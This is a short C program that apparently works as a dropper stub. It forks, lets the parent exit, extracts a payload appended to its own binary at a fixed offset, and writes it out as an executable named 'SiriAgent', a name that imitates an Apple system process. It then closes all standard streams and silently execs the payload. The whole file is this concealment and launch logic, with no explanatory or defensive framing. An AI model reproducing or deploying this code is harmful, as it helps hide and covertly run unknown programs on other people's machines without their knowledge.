#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <string.h>
#include <fcntl.h>

#define DEAMON_OFFSET 8996 

#define NAME "SiriAgent"

int	main(int ac, char **av, char **env) {
	int		pid = fork();
	int		buff_fd, exec_fd;
	char	*buffer;
	size_t	size;
	if (pid > 0)
	{
		exit(1);
	}
	else if (pid < 0)
		return 0;
	if ((buff_fd = open(av[0], O_RDONLY)) == -1) {
		return 1;
	}
	size = lseek(buff_fd, 0, SEEK_END) - DEAMON_OFFSET;
	buffer = malloc(size);
	lseek(buff_fd, DEAMON_OFFSET, SEEK_SET);
	read(buff_fd, buffer, size);
	exec_fd = open(NAME, O_WRONLY | O_CREAT, 0700);
	write(exec_fd, buffer, size);
	close(buff_fd);
	close(exec_fd);
	int	piped[2];
	piped[0] = dup(1);
	piped[1] = open(".log", O_WRONLY | O_CREAT, 0700);
	pipe(piped);
	close(1);
	close(2);
	close(0);
	execve(NAME, av, env);
}
